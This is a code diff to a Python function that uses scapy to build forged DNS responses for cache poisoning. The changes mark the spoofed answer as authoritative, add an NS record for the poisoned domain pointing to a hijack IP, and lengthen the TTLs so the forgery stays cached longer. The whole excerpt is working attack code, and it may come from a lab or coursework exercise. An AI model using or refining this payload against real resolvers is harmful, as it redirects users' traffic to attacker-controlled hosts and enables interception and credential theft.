@@ -101,25 +101,24 @@ def dns_payload(txid, query, hijack_ip):
     payload = scapy.DNS(
         id=txid,  # Set the TxID to match the one from the query
         qr=1,  # qr = 1 means this is a response
-        aa=0,  # Authoritative answer
+        aa=1,  # Authoritative answer
         ra=1,  # Recursion Available
         qdcount=1,
         ancount=1,
-        nscount=0,
+        nscount=1,
         arcount=1
     )
 
     # Add the original query in the Question Section
     payload.qd = scapy.DNSQR(qname=query, qtype="A", qclass="IN")
 
-    payload.an = scapy.DNSRR(rrname=query, type="A", ttl=12000, rdata=hijack_ip)
+    payload.an = scapy.DNSRR(rrname=query, type="A", ttl=86400, rdata=hijack_ip)
 
     # Add the Authority Section (NS record for the forged domain)
-    
-    payload.ns = scapy.DNSRR(rrname=query, type="NS", rdata=f"ns1.{domain_to_poision }", ttl=2000)
+    payload.ns = scapy.DNSRR(rrname=query, type="NS", rdata=f"ns1.{domain_to_poision }", ttl=86400)
     
     # Add the Additional Section (A record pointing ns1.example.com to the hijacked IP)
-    payload.ar = scapy.DNSRR(rrname=f"ns1.{domain_to_poision }", type="A", ttl=12000, rdata=hijack_ip)
+    payload.ar = scapy.DNSRR(rrname=f"ns1.{domain_to_poision }", type="A", ttl=604800, rdata=hijack_ip)
 
     return payload
 
